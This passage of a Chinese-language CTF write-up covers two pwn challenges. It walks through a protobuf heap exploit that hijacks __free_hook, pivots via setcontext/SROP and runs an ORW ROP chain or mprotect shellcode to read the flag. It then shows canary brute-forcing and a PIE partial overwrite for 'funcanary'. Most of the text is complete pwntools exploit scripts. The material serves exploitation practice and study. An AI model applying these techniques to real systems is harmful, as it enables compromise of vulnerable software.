> ![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685605218609-621d3f5f-e7d5-417d-8e2e-ac107c6a93f0.png#averageHue=%23100d0b&clientId=u6bbf0b64-1d57-4&from=paste&height=287&id=u9b8fd8c7&originHeight=474&originWidth=1113&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=99553&status=done&style=none&taskId=u74624295-a4c3-49b8-9ade-1ffff2aa751&title=&width=674.5454155577795)
> 因为又一次创建了缓冲，所以可以在改缓冲上进行编辑，利用这个缓冲

```python
new(8,0xf0,flat({ #使用flat将多个序列生成单一序列
        0x00: 0x67616C662F, # /flag  #在偏移0x00处存入flag字段
        0x28: libc_base+0x00000000000578c8, #做栈迁移
        0x48: heap_base+0xfa0  #指chunk，rop
}, filler=b'\x00')) #最后有b'\x00' 填充剩余的位置
```
#### 修改free_hook内容
因为rdi是free时候的指针，而【rdi】就等于取chunk里面的内容进行操作了，这样就能完美劫持程序流程，进行rop
```python
new(9,0xf0,p64(libc_base+0x0000000000154dea)) # rbp=[rdi+0x48]; rax=[rbp+0x18]; call [rax+0x28]
```
#### 释放chunk8，即原先idx=6，就可以进行rop
```python
free(8)
```
### 最终的图解
> 补充一个点：栈迁移
> 完成两个点即可：
> - 修改ebp为目标的栈空间
> - leave ret为到目标的点，并执行下一条指令
> - 先找gadget，再进行栈排布
> 
还有，保护全开，记得能泄露就泄露出来

![67a587ef707b3c34e646f7d71140d50.jpg](https://cdn.nlark.com/yuque/0/2023/jpeg/29466846/1685606843897-142a4d1a-2a73-426c-9a60-371d731cb6ab.jpeg#averageHue=%2398958f&clientId=u6bbf0b64-1d57-4&from=paste&height=3232&id=ucb9b7252&originHeight=4000&originWidth=3000&originalType=binary&ratio=1.6500000953674316&rotation=90&showTitle=false&size=1634014&status=done&style=none&taskId=u4c062e7a-85d0-4635-b952-5c72069e9d7&title=&width=2424)
### 其他解法
这种是属于常见的劫持程序流程到堆上，核心都是控制rsp到堆
#### 通过SROP+ROP链
> 关键点：控制rdx，因为是2.31的版本
> 能用orw，那就用mov_rdx_rdi_配合setcontext函数进行orw读flag了

```python
from pwn import *

from struct import pack

from ctypes import *

 

def s(a):

  p.send(a)

def sa(a, b):

  p.sendafter(a, b)

def sl(a):

  p.sendline(a)

def sla(a, b):

  p.sendlineafter(a, b)

def r():

  p.recv()

def pr():

  print(p.recv())

def rl(a):

  return p.recvuntil(a)

def inter():

  p.interactive()

def debug():

  gdb.attach(p)

  pause()

def get_addr():

  return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))

def get_sb():

  return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))

 

context(os='linux', arch='amd64', log_level='debug')

\#p = process("./pwn2")

p = remote('47.94.206.10', 34904)elf = ELF("./pwn2")

libc = ELF('./libc-2.31.so')

 

import sys

sys.path.append('./output')

import devicmesg_pb2

 

def add(idx, data_len, data):

    msg = devicmesg_pb2.devicmesg()

    msg.actionid = 1

    msg.msgidx = idx

    msg.msgsize = data_len

    msg.msgcontent = data

    serialized_msg = msg.SerializeToString()

    sa(b'now: \n', serialized_msg)

def edit(idx, data):

    msg = devicmesg_pb2.devicmesg()

    msg.actionid = 2

    msg.msgidx = idx

    msg.msgsize = 1

    msg.msgcontent = data

    serialized_msg = msg.SerializeToString()

    sa(b'now: \n', serialized_msg)

def show(idx):

    msg = devicmesg_pb2.devicmesg()

    msg.actionid = 3

    msg.msgidx = idx

    msg.msgsize = 1

    msg.msgcontent = b'a'

    serialized_msg = msg.SerializeToString()

    sa(b'now: \n', serialized_msg)

def free(idx):

    msg = devicmesg_pb2.devicmesg()

    msg.actionid = 4

    msg.msgidx = idx

    msg.msgsize = 1

    msg.msgcontent = b'a'

    serialized_msg = msg.SerializeToString()

    sa(b'now: \n', serialized_msg)

 

for i in range(1, 10):

    add(i, 0xf0, b'a'*0xf0)

for i in range(1, 9):

    free(i)

show(8)

p.recv(0x38)

heap_base = u64(p.recv(8)) - 0x1470

rl(b'\x7f')

libc_base = get_addr() - 0x1ecbe0 #

 

rax = libc_base + 0x36174

rdi = libc_base + 0x23b6a

rsi = libc_base + 0x2601f

rdx = libc_base + 0x142c92

rsp = libc_base + 0x2f70a

ret = libc_base + 0x22679

syscall = libc_base + 0x2284d

 

mov_rdx_rdi_ = libc_base + 0x151990

setcontext = libc_base + 0x54F5D 

buf = heap_base + 0x3000

flag = heap_base + 0x2088

 

free_hook = libc_base + libc.sym['__free_hook']

add(10, 0x20, b'a')

add(11, 0x20, b'a')

free(11)

free(10)

edit(10, p64(free_hook - 8))

add(12, 0x20, b'a')

payload = b'\x00'*8 + p64(mov_rdx_rdi_)

add(13, 0x20, payload)

add(14, 0xc0, (p64(heap_base + 0x1e20)*2 + p64(setcontext)*4).ljust(0xa0, b'\x00') + p64(heap_base + 0x640) + p64(ret))

 

open_ = libc_base + libc.sym['open']

read = libc_base + libc.sym['read']

write = libc_base + libc.sym['write']

puts = libc_base + libc.sym['puts']

 

orw = p64(rdi) + p64(flag) + p64(rsi) + p64(0) + p64(rdx) + p64(0) + p64(open_)

orw += p64(rdi) + p64(3) + p64(rsi) + p64(buf) + p64(rdx) + p64(0x30) + p64(read)

orw += p64(rdi) + p64(1) + p64(write)

orw += b'/flag\x00\x00\x00'

edit(2, orw)

 

free(14)

pr()

```
#### 通过SROP执行shellcode
```python
from pwn import *
from struct import pack
import binascii
import pp_pb2
from google.protobuf import message
import subprocess
elfname = './pwn'
libcname = './libc-2.31.so'
local = 1
if local:
    p = process(elfname)
else:
    p = remote('123.56.135.185', 23536)
elf = ELF(elfname)
libc = ELF(libcname)

context.log_level = 'debug'
context.arch = 'amd64'
context.binary = elfname




r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
c = lambda: p.close()
li = lambda x: log.info(x)
db = lambda: gdb.attach(p)
uu32 = lambda data: u32(data.ljust(4, '\x00'))
uu64 = lambda data: u64(data.ljust(8, '\x00'))

loginfo = lambda tag, addr: log.success(tag + " -> " + hex(addr))
cont = pp_pb2.devicemsg()
def add(idx,size,mem):
    cont.actionid=2
    cont.msgidx=idx*2
    cont.msgsize=size
    cont.msgcontent=mem
    sa("now:",cont.SerializeToString())
def delete(idx):
    cont.actionid = 8
    cont.msgidx = idx * 2
    cont.msgsize=4
    cont.msgcontent='a'
    sa("now:",cont.SerializeToString())
def show(idx):
    cont.actionid = 6
    cont.msgidx = idx * 2
    sa("now:",cont.SerializeToString())
def edit(idx,size,mem):
    cont.actionid = 4
    cont.msgidx = idx * 2
    cont.msgsize = size
    cont.msgcontent = mem
    sa("now:", cont.SerializeToString())
for i in range(9):
    add(i+1,0x80,'a'*0x80)
for i in range(9,0,-1):
    delete(i)
show(2)
ru('\n')
p.recv(0x38)
heapaddr=u64(p.recv(6).ljust(8,'\x00'))-0x540
loginfo("heap",heapaddr)
p.recv(0x1a)
libcbase=u64(p.recv(6).ljust(8,'\x00'))-0x1ecc10
loginfo("libc",libcbase)
freehook=libcbase+libc.sym['__free_hook']
setcontext=libcbase+libc.sym['setcontext']

gadget=0x0000000000151990+libcbase
edit(3,0x20,p64(freehook))
add(11,0x80,p64(gadget).ljust(0x80,'\x00'))
frame = SigreturnFrame()
mprotect=libcbase+libc.sym['mprotect']
flagaddr=heapaddr+0x2000
shellcode=shellcraft.open('flag',0,0)
shellcode+=shellcraft.read(3,flagaddr,0x50)
shellcode+=shellcraft.write(1,flagaddr,0x50)

frame.rsp = heapaddr+0x1618
frame.rdi=heapaddr+0x1000
frame.rsi=0x1000
frame.rdx=7
frame.rip = mprotect
print("len->"+hex(len(str(frame))))
add(12,0xf0,p64(setcontext+61)+p64(heapaddr+0x1500-0x40)+str(frame)[0x30:0x110])
conts="flag"+"\x00"*4+p64(heapaddr+0x1620)+asm(shellcode)
add(13,len(conts),conts)
#dbg()
delete(12)




p.interactive()
```
## funcanary（fork爆canary与partial write绕PIE）
#### 静态分析
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685457528760-5afab287-cd24-48fb-8df0-edf4a937da2a.png#averageHue=%23090605&clientId=ud8d6c821-098d-4&from=paste&height=189&id=uc69ed217&originHeight=312&originWidth=1017&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=91553&status=done&style=none&taskId=ua5952529-7549-467e-8a85-5e245e9bbc0&title=&width=616.3636007387796)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685454166108-7ff83e3f-497f-47d9-b6ed-3b58497f9bd5.png#averageHue=%23030201&clientId=ud8d6c821-098d-4&from=paste&height=411&id=u99b1ca38&originHeight=678&originWidth=1079&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=59315&status=done&style=none&taskId=u3e960d71-3489-452f-944e-c14254b3a9c&title=&width=653.9393561427171)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685454183627-e6ac812e-c7d1-421f-a7fa-73f83421f86b.png#averageHue=%23040302&clientId=ud8d6c821-098d-4&from=paste&height=208&id=u309ff6d8&originHeight=343&originWidth=1074&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=40322&status=done&style=none&taskId=u1ad53f48-79dc-478b-8028-b28ba88e434&title=&width=650.9090532875608)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685454225862-aab2ce0f-bf52-4a45-b0ab-a8360dbbe134.png#averageHue=%237e7d7d&clientId=ud8d6c821-098d-4&from=paste&height=581&id=u201462eb&originHeight=958&originWidth=1248&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=85822&status=done&style=none&taskId=u84b779cd-ab4f-49d8-a3fd-4618f936276&title=&width=756.3635926469981)<br />很够的一点：存在一个IDA无法识别的后门函数<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685454362493-c2d0e27f-87ba-4157-a99b-0dca8d250988.png#averageHue=%23080202&clientId=ud8d6c821-098d-4&from=paste&height=281&id=u882555e6&originHeight=464&originWidth=1619&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=64498&status=done&style=none&taskId=u7e404163-5e56-4325-81ae-d00df19c64d&title=&width=981.2120644995912)
> 找到这个后门的方法：
> shift + F2 查找 string
> 发现敏感字符串
> Alt + T 查找所有引用的字符串
> 最后就找到了这个后门函数

因为开启了PIE，所以要用这个后门，还得绕过PIE的保护。
> partial write就是利用了PIE技术的缺陷。我们知道，内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后**三位十六进制数的地址是始终不变的**。因此我们可以通过覆盖地址的后几位来可以控制程序的流程

注意：只有后三位不变！！！<br />![Snipaste_2023-05-30_22-30-32.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685458799001-313f2497-14a6-42ed-9134-ea5503c057d1.png#averageHue=%23050403&clientId=u0082e65c-a6da-4&from=paste&height=244&id=ua87dcb3b&originHeight=402&originWidth=1940&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=141466&status=done&style=none&taskId=u622db2c6-a497-4e81-b35a-daac84369d9&title=&width=1175.757507800622)
#### 最终思路
想要利用栈溢出，必须绕过PIE和CANARY保护，由于此处是read可以不接受换行符，我们可以用pwntools中的p.send然后爆破canary，爆破完canary之后，由于overflow函数的返回地址是一个TEXT段上的地址(rebase(0x1329))，并且发现很狗的是程序中还隐藏了一个IDA识别不出来的后门函数。
#### 脚本一：爆破第4位
```c
from pwn import *

elfname = './funcanary'
#libcname = './libc.so.6'

p = process(elfname)

elf = ELF(elfname)

context.log_level = 'debug'
context.arch = 'amd64'

r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
c = lambda: p.close()
li = lambda x: log.info(x)
db = lambda: gdb.attach(p)

canary = '\x00'

for j in  range(7):
    for i in range(0x100):
        payload = 0x68*'a' + canary + chr(i)
        sa(b"welcome\n",payload)
        a = p.recvline()
        if b'have fun' in a:
            canary += chr(i)
            break

print(canary)

i=0
while True:
    sa("welcome\n", b'd' * 0x68 + flat(canary) +b'm'*8+ p8(0x2E) +p8(0x2+0x10*i))
    i=i+1
    if(i==0x10):
        i=0
    if b"flag" in p.recvline():
        break;

```
#### 脚本二：利用页的大小累加控制第4位
```c
from pwn import *
context(log_level='debug',arch='amd64',os='linux')

#io = process('./funcanary' )
io = remote('123.56.135.185',42164)
io.recvuntil('welcome\n')
canary = b'\x00'

for k in range(7):
    for i in range(0x100):
        io.send('a'*0x68 + canary + chr(i))
        a = io.recvuntil("welcome\n")
        #print(a)
        if "fun" in a:
            canary += chr(i)
            print("canary: ", canary)
            break

cat_flag = 0x0231

for i in range(16):
    io.send('a'*0x68 + canary + 'b'*8 + p16(cat_flag))
    a = io.recvuntil("welcome\n")
    cat_flag += 0x1000
    if "flag" in a:
        print(a)
        break

io.interactive()
```